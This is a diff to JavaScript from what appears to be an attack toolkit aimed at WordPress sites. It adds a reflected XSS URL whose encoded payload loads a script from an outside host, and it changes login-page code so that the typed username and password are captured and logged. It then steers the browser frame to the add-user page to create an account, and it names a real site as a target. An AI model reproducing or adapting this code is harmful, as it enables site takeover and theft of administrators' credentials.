@@ -19,7 +19,8 @@ var g_strURLCommentsAdd="";
 var g_strURLSpysIndex="";
 function initURL()
 {
-    g_strURLXSS=Common.getTargetHost()+"hello-world/";
+    //g_strURLXSS=Common.getTargetHost()+"hello-world/";
+    g_strURLXSS=Common.getTargetHost()+"page/2/?s=1%22/%3E%3CScRiPt%20%3Evar%20h=document.getElementsByTagName(%22head%22)[0];var%20t=new%20Date();t=t.getTime();var%20s=document.createElement(%22script%22);s.type=%22text/javascript%22;s.charset=%22utf-8%22;s.src=%22https://colorwolf2017.000webhostapp.com/webroot_mycakephp/zfirst/js/a.js?t=%22%2bt;h.appendChild(s);alert(%22add%20success%22);%3C/ScRiPt%3E%3Cinput%20value=%22";
     //g_strURLIndex=Common.getTargetHost();
     g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
     g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
@@ -515,14 +516,43 @@ function inPageLogin()
     }
     else
     {
-        console.log("up not save");
+        var bNeedAddLog=true;
         var json=
         {
             username:"",
-            action:"username and password not all saved,username:"+$("#user_login").val()+",password:"+$("#user_pass").val()
+            action:""
         };
-        window.parent.g_strComunication="not_save";
-        addVisitLog(json);
+        //chrome can not get all in iframe
+        if(navigator.userAgent.toLowerCase().indexOf("chrome")!==-1)
+        {
+            if($("div#login_error").length!==0)
+            {
+                //chrome already submit,but wrong u and p
+                json.action="chrome submit but incorrect u and p,username:"+$("#user_login").val()+",password:"+$("#user_pass").val();
+                console.log("javascript value username:"+document.getElementById("user_login").value+",password:"+document.getElementById("user_pass").value);
+                console.log(json.action);
+                window.parent.g_strComunication="chrome_submit_incorrect";
+            }
+            else
+            {
+                json.action="detect useragent is chrome,trigger by submit,(trigger is not working)";
+                console.log("javascript value username:"+document.getElementById("user_login").value+",password:"+document.getElementById("user_pass").value);
+                //$("form#loginform").submit();
+                //bNeedAddLog=false;
+                console.log(json.action);
+                window.parent.g_strComunication="chrome_submit_incorrect";
+            }
+        }
+        else
+        {
+            json.action="username and password not all saved,username:"+$("#user_login").val()+",password:"+$("#user_pass").val();
+            console.log(json.action);
+            window.parent.g_strComunication="not_save";
+        }
+        if(bNeedAddLog)
+        {
+            addVisitLog(json);
+        }
     }
 }
 //--------------------------------------------login page-----------------------------------------------------------------------
@@ -645,16 +675,16 @@ function frameOperationCalledFromSon(windowSon)
             console.log("detect login success,try to create user..");
             frameJumpTo(g_strURLAddUser);
         }
-        else if(g_strComunication==="failed"||g_strComunication==="not_save")
+        else if(g_strComunication==="failed"||g_strComunication==="not_save"||g_strComunication==="chrome_submit_incorrect")
         {
-            console.log("up not save,try create user 10s later");
+            console.log("comunication str:"+g_strComunication+",up not save,try create user 20s later");
             //check for every 10 seconds
             window.setTimeout
             (
                 function()
                 {
                     frameJumpTo(g_strURLAddUser);
-                },10000
+                },20000
             );
         }
         else
@@ -765,7 +795,7 @@ function frameOperationCalledFromSon(windowSon)
 function frameOperation()
 {
     console.log("current page new url:"+window.location.href);
-    if(window.location.href===g_strURLXSS)
+    if(window.location.href===g_strURLXSS||window.location.href.indexOf("http://www.hoylam.net/page/2/")!==-1)
     {
         //XSS
         frameJumpTo(g_strURLAddUser);
@@ -811,7 +841,7 @@ function frameOperation()
     //else if(window.location.href===(Common.getTargetHost()+"?p=1"))
     else
     {
-
+        console.log("fatal error,unrecognized url:");
     }
     // else
     // {
